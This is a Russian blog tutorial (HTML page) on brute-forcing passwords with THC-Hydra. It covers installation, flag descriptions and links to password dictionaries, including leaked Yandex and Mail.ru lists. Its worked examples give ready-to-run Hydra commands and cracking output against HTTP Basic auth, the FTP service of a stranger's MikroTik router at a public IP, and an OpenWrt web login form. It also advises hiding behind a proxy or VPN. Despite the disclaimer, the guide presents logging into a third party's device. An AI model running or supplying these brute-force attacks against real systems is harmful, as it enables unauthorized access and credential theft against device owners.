@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="renderer" content="webkit">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  <title>Брутим пароли с Гидрой (hydra) - blog [dot] hook</title>
+  
+  <meta name="description" content=" Статья носит носит строго познавательный характер, за применение кем либо описанных в статье методик автор ответственности не несет.
+ В тот момент, когда пинтест заходит в тупик - одним из крайних аргументов в тесте на проникновение является подбор паролей. Сервисы, к которым можно применить данный метод атаки - самые различные. А как следствие - различны и протоколы, и форматы обращений. Надо бы как то унифицировать инструменты для решения этой задачи - не хорошо под каждый новый случай писать новый брутер своими ручками.">
+  <meta name="author" content="Paramtamtam">
+  
+  <style>
+    .pace {pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}
+    .pace-inactive {display:none}
+    .pace .pace-progress {background:#2299dd;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:1px}
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"
+          integrity="sha256-EPrkNjGEmCWyazb3A/Epj+W7Qm2pB9vnfXw+X6LImPM="
+          crossorigin="anonymous"></script>
+  
+  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,700,700i" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/obsidian.min.css"
+        integrity="sha256-DSLpkHOyIkdP+qB1tVfhDqoTis6ZnkH6fJIYxRoMUZY="
+        crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+        integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0="
+        crossorigin="anonymous" />
+  <link href="https://tarampampam.github.io/blog/css/style.css?v=1590232270" rel="stylesheet">
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="https://tarampampam.github.io/blog/apple-touch-icon.png?v=1590232270">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://tarampampam.github.io/blog/favicon-32x32.png?v=1590232270">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://tarampampam.github.io/blog/favicon-16x16.png?v=1590232270">
+  <link rel="manifest" href="https://tarampampam.github.io/blog/site.webmanifest">
+  <meta name="msapplication-TileColor" content="#282b2f">
+  <meta name="theme-color" content="#282b2f">
+  
+  </head>
+<body class="single">
+  <header class="header">
+    
+    <p class="title"><a href="https://tarampampam.github.io/blog/">blog [dot] hook</a></p>
+    
+    <button class="menu-toggle" type="button"></button>
+    <nav class="menu">
+      <ul>
+        
+        
+        <li class="">
+          <a href="/blog/adm/">Adm</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/dev/">Dev</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/docker/">Docker</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/etc/">Etc</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/hack/">Hack</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/hard/">Hard</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/mikrotik/">Mikrotik</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/my-book-live/">My-book-live</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/nix/">Nix</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/php/">Php</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/software/">Software</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/text/">Text</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/tnt/">Tnt</a>
+        </li>
+        
+        <li class="">
+          <a href="/blog/wp/">Wp</a>
+        </li>
+        
+      </ul>
+    </nav>
+  </header>
+  <main class="main">
+
+<article class="post post-view" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="headline">Брутим пароли с Гидрой (hydra)</h1>
+    <p class="post-meta"><i class="fa fa-user-secret" aria-hidden="true"></i> <span itemprop="author">
+        Paramtamtam
+      </span> · 
+      <i class="fa fa-calendar-check-o" aria-hidden="true"></i>&nbsp;<time datetime="2015-08-12"
+        itemprop="datePublished">2015.8.12</time>
+      &nbsp;&middot; <i class="fa fa-clock-o" aria-hidden="true"></i> 13 min
+    </p>
+  </header>
+  <div class="post-content" itemprop="articleBody">
+    
+      <div class="post-featured-image">
+        <img src="https://tarampampam.github.io/images/posts/hydra-wide.jpg" itemprop="image" alt="Брутим пароли с Гидрой (hydra)" />
+      </div>
+    
+
+    <div class="outdated-post" data-posted-at="2015-08-12">
+      <strong>Внимание!</strong> Данный пост был опубликован более года назад и, возможно, уже утратил свою былую
+      актуальность. Но это не точно.
+    </div>
+
+    <blockquote>
+<p>Статья носит носит строго познавательный характер, за применение кем либо описанных в статье методик автор ответственности не несет.</p>
+</blockquote>
+
+<p>В тот момент, когда пинтест заходит в тупик - одним из крайних аргументов в тесте на проникновение является подбор паролей. Сервисы, к которым можно применить данный метод атаки - самые различные. А как следствие - различны и протоколы, и форматы обращений. Надо бы как то унифицировать инструменты для решения этой задачи - не хорошо под каждый новый случай писать новый брутер своими ручками.</p>
+
+<p>И такой инструмент уже имеет место быть. Быстрый, сочный, достойный внимания - <a href="https://github.com/vanhauser-thc/thc-hydra">THC-Hydra</a>. Версия 7.5 (<em>из репозитория epel</em>) поддерживает подбор по/для: <code>asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp rexec rlogin rsh sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</code>. Примеры эксплуатации мы рассмотрим чуть ниже, а пока - посмотрим как можно заполучить данный инструмент в свой арсенал.</p>
+
+<h3 id="установка">Установка</h3>
+
+<p>Пользователям CentOS будет достаточно подключить репозиторий <code>epel</code> и выполнить:</p>
+
+<pre><code># yum install -y epel-release
+$ yum install -y hydra
+</code></pre>
+
+<p>Или для сборки из сорсов (актуально для linux, *bsd, solaris и т.д., а так же MacOS и мобильных системах, базирующихся на Linux):</p>
+
+<pre><code class="language-bash">$ mkdir ~/hydra_src &amp;&amp; cd ~/hydra_src
+$ wget https://github.com/vanhauser-thc/thc-hydra/archive/master.zip &amp;&amp; unzip master.zip &amp;&amp; rm -f master.zip
+$ cd thc-hydra-master/
+$ yum install gcc mysql-devel libssh
+# Для Debian - libmysqld-dev и libssh-dev
+$ make clean &amp;&amp; ./configure
+$ make &amp;&amp; make install
+$ ./hydra -h
+Hydra v8.2-dev 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SOuvVd46] [service://server[:PORT][/OPT]]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type &quot;-x -h&quot; to get help
+  -e nsr    try &quot;n&quot; null password, &quot;s&quot; login as pass and/or &quot;r&quot; reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel (per host, default: 16)
+  -w / -W TIME  waittime for responses (32s) / between connects per thread
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
+  -O        use old SSL v2 and v3
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+</code></pre>
+
+<blockquote>
+<p>По умолчанию бинарники гидры будут в директории <code>/usr/local/bin/</code>, ежели что пропиши этот путь в <code>~/.bash_profile</code>, дописав его в переменной <code>PATH</code>.</p>
+
+<p>При сборке из сорсов мы разумеется получаем самую свежую и сочную версию. В репах как правило лежит уже несколько устаревшая.</p>
+</blockquote>
+
+<p>И ещё более простой вариант - использовать дистрибутив <a href="https://www.kali.org/downloads/">Kali Linux</a> - там уже всё есть.</p>
+
+<h3 id="словари">Словари</h3>
+
+<p>Брутить можно как с помощью подбора посимвольно, так и с помощью подготовленного словаря наиболее часто используемых паролей. Таки рекомендую первым делом попытаться подобрать пароль со словарем, и уже если и этот способ не увенчался успехом - переходить к прямому бруту посмивольно.</p>
+
+<p>Где взять словари? Например, можно <a href="https://wiki.skullsecurity.org/Passwords">пошариться на этой странице</a> или глянуть сразу <a href="https://downloads.skullsecurity.org/passwords/">здесь</a> - имена архивов более чем говорящие. От себя лишь скажу, что использую в основном 3 словаря:</p>
+
+<ul>
+<li>Очень маленький и очень популярный (<em>топ первые 500 паролей</em>);</li>
+<li>Второй побольше - на 5000 паролей;</li>
+<li>Третий от Cain &amp; Abel на ~300000 паролей.</li>
+</ul>
+
+<p>И в таком же порядке их применяю во время теста. Второй словарь - это слитые воедино несколько других не менее популярных списков (<em>отсортированный с удалением дубликатов и комментариев</em>) который можно получить, например, так:</p>
+
+<pre><code class="language-bash">$ cat twitter-banned.txt 500-worst-passwords.txt lower john.txt password | grep -v '^#' | sort -u &gt; all_small_dic.txt
+</code></pre>
+
+<p>В качестве бонуса можешь забрать готовые списки паролей (<em>top500; top4000; cain&amp;abel (300k); пароли от яндекса (700k); пароли от маил.ру (2740k); маил.ру + яндекс (3300k)</em>):</p>
+
+<ul>
+<li><a href="https://yadi.sk/d/2eXZv4s33aM4Hw">passwords_list.zip</a></li>
+</ul>
+
+<p>В общем, считаем что словари у тебя готовы к применению. Как пользоваться гидрой?</p>
+
+<h3 id="я-есть-грут-брут">Я есть <del>Грут</del> Брут</h3>
+
+<p>Какие настройки и возможности предоставляет нам гидра? Давай рассмотрим флаги запуска по порядку:</p>
+
+<table>
+<thead>
+<tr>
+<th>Флаг</th>
+<th>Описание</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td><code>-R</code></td>
+<td>Восстановить предыдущую сессию, которая по какой-либо причине была прервана</td>
+</tr>
+
+<tr>
+<td><code>-S</code></td>
+<td>Использовать SSL соединение</td>
+</tr>
+
+<tr>
+<td><code>-s PORT</code></td>
+<td>Указание порта (<em>отличного от дефолтного</em>) сервиса</td>
+</tr>
+
+<tr>
+<td><code>-l LOGIN</code></td>
+<td>Использовать указанный логин для попытки аутентификации</td>
+</tr>
+
+<tr>
+<td><code>-L FILE</code></td>
+<td>Использовать список логинов из указанного файла</td>
+</tr>
+
+<tr>
+<td><code>-p PASS</code></td>
+<td>Использовать указанный пароль для попытки аутентификации</td>
+</tr>
+
+<tr>
+<td><code>-P FILE</code></td>
+<td>Использовать список паролей из указанного файла</td>
+</tr>
+
+<tr>
+<td><code>-x</code></td>
+<td>Генерировать пароли для подбора самостоятельно, указывается в формате <code>-x MIN:MAX:CHARSET</code>, где <code>MIN</code> - это минимальная длинна пароля, <code>MAX</code> - соответственно, максимальная, а <code>CHARSET</code> - это набор символов, в котором <code>a</code> означает латиницу в нижнем регистре, <code>A</code> - в верхнем регистре, <code>1</code> - числа, а для указания дополнительных символов - просто укажи их как есть. Вот несколько примеров генерации паролей: <code>-x 3:5:a</code> - длинной от 3 до 5 символов, состоящие только из символов латиницы в нижнем регистре; <code>-x 5:8:A1</code> - длинной от 5 до 8 символов, состоящие из символов латиницы в верхнем регистре + цифр; <code>-x 1:3:/</code> - длинной от 1 до 3 символов, состоящие только из символов слеша <code>/</code>; <code>-x 5:5:/%,.-</code> - длинной в 5 символов, состоящие только из символов <code>/%,.-</code></td>
+</tr>
+
+<tr>
+<td><code>-e nsr</code></td>
+<td>Укажи <code>n</code> для проверки пустых паролей, <code>s</code> для попытки использования в качестве пароля - логин, и (<em>или</em>) <code>r</code> для попытки входа под перевернутым логином</td>
+</tr>
+
+<tr>
+<td><code>-u</code></td>
+<td>Пытаться подобрать логин а не пароль</td>
+</tr>
+
+<tr>
+<td><code>-C FILE</code></td>
+<td>Использовать файл в формате <code>login:pass</code> вместо указания <code>-L</code>/<code>-P</code></td>
+</tr>
+
+<tr>
+<td><code>-M FILE</code></td>
+<td>Файл со списком целей для брутфорса (<em>можно с указанием порта через двоеточие</em>), по одному на строку</td>
+</tr>
+
+<tr>
+<td><code>-o FILE</code></td>
+<td>Записать подобранную пару логин/пароль в файл, вместо того чтоб просто вывести в stdout (<em>будет указан с указанием сервера, к которому подобран - не запутаешься</em>)</td>
+</tr>
+
+<tr>
+<td><code>-f / -F</code></td>
+<td>Прекратить работу, как только первая пара логин:пароль будет подобрана. <code>-f</code> только для текущего хоста,<code>-F</code> - глобально.</td>
+</tr>
+
+<tr>
+<td><code>-t TASKS</code></td>
+<td>Количество параллельных процессов (<em>читай - потоков</em>). По умолчанию 16</td>
+</tr>
+
+<tr>
+<td><code>-w</code></td>
+<td>Таймаут <em>для ответа</em> сервера. По умолчанию 32 секунды</td>
+</tr>
+
+<tr>
+<td><code>-W</code></td>
+<td>Таймаут <em>между</em> ответами сервера</td>
+</tr>
+
+<tr>
+<td><code>-4 / -6</code></td>
+<td>Использовать IPv4 (<em>по умолчанию</em>) или IPv6 адреса (при указании с <code>-M</code> всегда заключай в <code>[]</code>)</td>
+</tr>
+
+<tr>
+<td><code>-v</code></td>
+<td>Более подробный вывод информации о процессе</td>
+</tr>
+
+<tr>
+<td><code>-V</code></td>
+<td>Выводить каждый подбираемый логин + пароль</td>
+</tr>
+
+<tr>
+<td><code>-d</code></td>
+<td>Режим дебага</td>
+</tr>
+
+<tr>
+<td><code>-O</code></td>
+<td>Использовать старый <code>SSL v2</code> и <code>v3</code></td>
+</tr>
+
+<tr>
+<td><code>-q</code></td>
+<td>Не выводить сообщения об ошибках подключения</td>
+</tr>
+
+<tr>
+<td><code>-U</code></td>
+<td>Дополнительная информация о использовании выбранного модуля</td>
+</tr>
+
+<tr>
+<td><code>-h</code></td>
+<td>Вывод справочной информации</td>
+</tr>
+</tbody>
+</table>
+
+<h3 id="гидра-фас">Гидра - фас!</h3>
+
+<p>Теперь давай рассмотрим пример работы на определенных целях. Все IP - вымышленные, соответствие с реальными - чистейшей воды совпадение ;)</p>
+
+<blockquote>
+<p>Ахтунг! Юзай proxy/socks/vpn для безопасности собственной задницы. Так, сугубо на всякий случай</p>
+</blockquote>
+
+<h4 id="basic-authentication">Basic Authentication</h4>
+
+<p>Например, сканируя диапазон адресов мы натыкаемся на некоторый интерфейс, доступный по http протоколу, но закрытый для доступа при помощи Basic Authentication (<a href="http://nginx.org/ru/docs/http/ngx_http_auth_basic_module.html">пример настройки с помощью nginx</a>):</p>
+
+<p><img src="https://habrastorage.org/files/2b8/736/1f8/2b87361f8217444ea5a12e36482fac53" alt="" /></p>
+
+<p>И у нас стоит задача вспомнить наш же забытый пароль ;) Давай определимся с тем, какие данные у нас есть:</p>
+
+<ul>
+<li>IP сервера <code>192.168.1.2</code>;</li>
+<li>Сервис <code>http</code>;</li>
+<li>Путь, который закрыт для нас запросом пары логин:пароль <code>/private/</code>;</li>
+<li>Порт, на котором работает http сервер <code>80</code> (<em>стандартный</em>);</li>
+</ul>
+
+<p>Предположим (<em>или любым доступным путем выясним</em>), что логин используется <code>admin</code>, и нам неизвестен лишь пароль. Подбирать будем с помощью заранее подготовленного словаря и с использованием модуля <code>http-get</code>:</p>
+
+<pre><code class="language-bash">$ hydra -l admin -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 13:01:25
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task
+[DATA] attacking service http-get on port 80
+[ATTEMPT] target 192.168.1.2 - login &quot;admin&quot; - pass &quot;!&quot; - 1 of 488 [child 0]
+[ATTEMPT] target 192.168.1.2 - login &quot;admin&quot; - pass &quot;!!!&quot; - 2 of 488 [child 1]
+[ATTEMPT] target 192.168.1.2 - login &quot;admin&quot; - pass &quot;!!!!&quot; - 3 of 488 [child 2]
+...
+[ATTEMPT] target 192.168.1.2 - login &quot;admin&quot; - pass &quot;administrat0r&quot; - 250 of 488 [child 0]
+[ATTEMPT] target 192.168.1.2 - login &quot;admin&quot; - pass &quot;administrator&quot; - 251 of 488 [child 2]
+[ATTEMPT] target 192.168.1.2 - login &quot;admin&quot; - pass &quot;administrator1&quot; - 252 of 488 [child 13]
+[80][http-get] host: 192.168.1.2   login: admin   password: admin
+#                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[STATUS] attack finished for 192.168.1.2 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:01:26
+
+$ cat ./hydra_result.log 
+# Hydra v8.1 run at 2015-08-12 13:01:25 on 192.168.1.2 http-get (hydra -l admin -P /root/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/)
+[80][http-get] host: 192.168.1.2   login: admin   password: admin
+#                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+</code></pre>
+
+<p>Пабам - и через 1 секунду <em>стандартный</em> пароль <code>admin</code> успешно сбручен!</p>
+
+<h4 id="ftp">FTP</h4>
+
+<p>Другой пример - случайно находим в сети роутер MikroTik, да с открытыми наружу портами 80 (http) и 21 (ftp). Решаем сообщить его владельцу о наличии данной неприятности, но для этого нужно сперва получить доступ к этому самому микротику.</p>
+
+<p>Брутить вебморду микротика можно, но проходит это значительно медленнее, чем например брутить ftp. А мы знаем, что стандартный логин на микротиках <code>admin</code>, и используется один пароль ко всем сервисам. Получив пароль для ftp - получим доступ ко всему остальному:</p>
+
+<p><img src="https://habrastorage.org/files/01f/0d6/e97/01f0d6e979af4ac6a654c89a7923fd02" alt="" /></p>
+
+<p>Исходные данные:</p>
+
+<ul>
+<li>IP сервера <code>178.72.83.246</code>;</li>
+<li>Сервис <code>ftp</code>;</li>
+<li>Стандартный логин <code>admin</code>;</li>
+<li>Порт, на котором работает ftp сервер <code>21</code> (<em>стандартный</em>);</li>
+</ul>
+
+<p>Запускаем гидру:</p>
+
+<pre><code class="language-bash">$ hydra -l admin -P ~/pass_lists/all_small_dic.txt -o ./hydra_result.log -f -V -s 21 178.72.83.246 ftp
+</code></pre>
+
+<p>И наблюдаем процесс подбора (<em>~900 паролей в минуту</em>):</p>
+
+<pre><code>[DATA] max 16 tasks per 1 server, overall 64 tasks, 4106 login tries (l:1/p:4106), ~4 tries per task
+[DATA] attacking service ftp on port 21
+[ATTEMPT] target 178.72.83.246 - login &quot;admin&quot; - pass &quot;&quot; - 1 of 4106 [child 0]
+[ATTEMPT] target 178.72.83.246 - login &quot;admin&quot; - pass &quot;!@#$%&quot; - 2 of 4106 [child 1]
+[ATTEMPT] target 178.72.83.246 - login &quot;admin&quot; - pass &quot;!@#$%^&quot; - 3 of 4106 [child 2]
+[ATTEMPT] target 178.72.83.246 - login &quot;admin&quot; - pass &quot;!@#$%^&amp;&quot; - 4 of 4106 [child 3]
+...
+[ATTEMPT] target 178.72.83.246 - login &quot;admin&quot; - pass &quot;adminadmin&quot; - 249 of 488 [child 5]
+[ATTEMPT] target 178.72.83.246 - login &quot;admin&quot; - pass &quot;administrat0r&quot; - 250 of 488 [child 0]
+[ATTEMPT] target 178.72.83.246 - login &quot;admin&quot; - pass &quot;administrator&quot; - 251 of 488 [child 14]
+[21][ftp] host: 178.72.83.246   login: admin   password: adminadmin
+#                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[STATUS] attack finished for 178.72.83.246 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:46:51
+</code></pre>
+
+<p>Спустя каких то 30 секунд ещё один словарный пароль <code>adminadmin</code> был успешно подобран. После этого успешно логинимся в веб-панель:</p>
+
+<p><img src="https://habrastorage.org/files/7c2/bba/0cb/7c2bba0cbb864ce6953a3a7adcf0dc9c" alt="" /></p>
+
+<p>Выясняем контакты администратора, сообщаем ему о наличии уязвимости, и больше ничего не делаем ;)</p>
+
+<h4 id="веб-авторизация">Веб - авторизация</h4>
+
+<p>Например - мы забыли пароль к роутеру, который использует веб-авторизацию. Т.е. не просто &ldquo;выплывающее окошко браузера&rdquo;, а полноценные поля для ввода пары логин:пароль. Давай попытаемся подобрать пароль и к нему. В рассматриваемом примере это OpenWrt:</p>
+
+<p><img src="https://habrastorage.org/files/ad2/e6d/ba9/ad2e6dba902c4c07adddcdda88ae4ba8" alt="" /></p>
+
+<p>Открываем панель отладки браузера (<code>F12</code> в Chromium-based браузерах), вкладка <code>Network</code> и отмечаем галочкой <code>Preserve log</code>. После этого вводим пароль, например, <code>test_passw0rd</code> (<em>логин у нас уже введен</em>), жмем кнопку &ldquo;Login&rdquo;, и смотрим в консоли что и куда уходит:</p>
+
+<p><img src="https://habrastorage.org/files/3c8/62d/0d0/3c862d0d07034913a3e285feb5f3fe5c" alt="" /></p>
+
+<p>Отлично, теперь давай подытожим те данные, которыми мы располагаем:</p>
+
+<ul>
+<li>IP сервера <code>178.72.90.181</code>;</li>
+<li>Сервис <code>http</code> на стандартном <code>80</code> порту;</li>
+<li>Для авторизации используется html форма, которая отправляет по адресу <code>http://178.72.90.181/cgi-bin/luci</code> методом <code>POST</code> запрос вида <code>username=root&amp;password=test_passw0rd</code>;</li>
+<li>В случае не удачной аутентификации пользователь наблюдает сообщение <code>Invalid username and/or password! Please try again.</code>;</li>
+</ul>
+
+<p>Приступим к запуску гидры:</p>
+
+<pre><code class="language-bash">$ hydra -l root -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form &quot;/cgi-bin/luci:username=^USER^&amp;password=^PASS^:Invalid username&quot;
+</code></pre>
+
+<p>И тут надо кое-что пояснить. Мы используем <code>http-post-form</code> потому как авторизация происходит по <code>http</code> методом <code>post</code>. После указания этого модуля идет строка <code>/cgi-bin/luci:username=^USER^&amp;password=^PASS^:Invalid username</code>, у которой через двоеточие (<code>:</code>) указывается:</p>
+
+<ol>
+<li>Путь до скрипта, который обрабатывает процесс аутентификации. В нашем случае это <code>/cgi-bin/luci</code>;</li>
+<li>Строка, которая передается методом POST, в которой логин и пароль заменены на <code>^USER^</code> и <code>^PASS^</code> соответственно. У нас это <code>username=^USER^&amp;password=^PASS^</code>;</li>
+<li>Строка, которая <strong>присутствует</strong> на странице при <strong>неудачной</strong> аутентификации. При её <strong>отсутствии</strong> гидра поймет что мы успешно вошли. В нашем случае это <code>Invalid username</code>;</li>
+</ol>
+
+<p>Подбор в моем случае идет довольно медленно (<em>~16 паролей в минуту</em>), и связано это в первую очередь с качеством канала и способностью железки обрабатывать запросы. Как мы видим - ей довольно тяжело это делать:</p>
+
+<pre><code>Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:15:12
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task
+[DATA] attacking service http-post-form on port 80
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;!&quot; - 1 of 488 [child 0]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;!!!&quot; - 2 of 488 [child 1]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;!!!!&quot; - 3 of 488 [child 2]
+# ...
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;%username%1&quot; - 18 of 488 [child 1]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;%username%12&quot; - 19 of 488 [child 2]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;%username%123&quot; - 20 of 488 [child 15]
+[STATUS] 20.00 tries/min, 20 tries in 00:01h, 468 to do in 00:24h, 16 active
+
+</code></pre>
+
+<p>Подбор пароля по словарю ничего нам не дал, поэтому мы запустим посимвольный перебор. Длину пароля возьмем от 5 до 9 символов, латиницу в нижнем регистре с цифрами и символами <code>!@#</code>:</p>
+
+<pre><code class="language-bash">$ hydra -l root -x &quot;5:9:a1\!@#&quot; -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form &quot;/cgi-bin/luci:username=^USER^&amp;password=^PASS^:Invalid username&quot;
+</code></pre>
+
+<p>И видим что процесс успешно запустился:</p>
+
+<pre><code>Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:31:01
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 268865638400000 login tries (l:1/p:268865638400000), ~262564100000 tries per task
+[DATA] attacking service http-post-form on port 80
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaaa&quot; - 1 of 268865638400000 [child 0]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaab&quot; - 2 of 268865638400000 [child 1]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaac&quot; - 3 of 268865638400000 [child 2]
+# ...
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaa7&quot; - 30 of 268865638400000 [child 0]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaa8&quot; - 31 of 268865638400000 [child 2]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaa9&quot; - 32 of 268865638400000 [child 1]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaa@&quot; - 33 of 268865638400000 [child 11]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaa#&quot; - 34 of 268865638400000 [child 4]
+[ATTEMPT] target 178.72.90.181 - login &quot;root&quot; - pass &quot;aaaba&quot; - 35 of 268865638400000 [child 7]
+</code></pre>
+
+<p>И понимая безысходность данного подхода останавливаем процесс, возвращаясь к перебору по большому словарю.</p>
+
+<blockquote>
+<p>Кстати, для запуска hydra в фоне с продолжением её работы после того, как ты отключишься от ssh можно поступить следующим образом:</p>
+
+<pre><code class="language-bash">$ hydra -bla -bla -bla -o ./hydra_result.log
+# Нажимаем CTRL + Z
+$ disown -h %1
+# После этого отключаемся или продолжаем работу
+# Для возврата к процессу перебора выполни '$ bg 1'
+
+# Для того, чтоб после посмотреть работает ли гидра выполни:
+$ ps ax | grep hydra
+
+# А для того чтоб убить все процессы с гидрой:
+$ for proc in $(ps ax | grep hydra | cut -d&quot; &quot; -f 1); do kill $proc; done;
+</code></pre>
+</blockquote>
+
+<h3 id="вместо-заключения">Вместо заключения</h3>
+
+<p>Не ленись настраивать на своих сервисах/железках защиту от брутфорса. Не используй фуфлыжные пароли. Не расценивай данный материал как призыв к каким-либо действиям. Используй для тестирования <strong>своих</strong> сервисов.</p>
+
+    
+    </blockquote>
+  </div>
+  <footer class="post-footer">
+    
+    <ul class="post-tags">
+      
+      <li><a href="https://tarampampam.github.io/blog/tags/access/">access</a></li>
+      
+      <li><a href="https://tarampampam.github.io/blog/tags/bruteforce/">bruteforce</a></li>
+      
+      <li><a href="https://tarampampam.github.io/blog/tags/centos/">centos</a></li>
+      
+      <li><a href="https://tarampampam.github.io/blog/tags/hack/">hack</a></li>
+      
+      <li><a href="https://tarampampam.github.io/blog/tags/linux/">linux</a></li>
+      
+      <li><a href="https://tarampampam.github.io/blog/tags/security/">security</a></li>
+      
+    </ul>
+    
+  </footer>
+  
+
+  
+    <div class="comments-area">
+      
+      <div id="utteranc-comments"></div>
+      <script>
+        (function () {
+          window.setTimeout(function () {
+            let d = document, s = d.createElement('script');
+            s.src = 'https://utteranc.es/client.js';
+            s.setAttribute('repo', 'tarampampam\/blog');
+            s.setAttribute('issue-term', 'pathname');
+            s.setAttribute('crossorigin', 'anonymous');
+            s.async = true;
+            s.defer = true;
+            d.getElementById('utteranc-comments').appendChild(s);
+          }, 100);
+        })();
+      </script>
+      
+
+      
+
+    
+  </div>
+  
+</article>
+</main>
+<footer class="footer">
+  <span>2020 &copy; Make love, not war</span>
+  
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"
+        integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw="
+        crossorigin="anonymous"
+        data-no-instant></script>
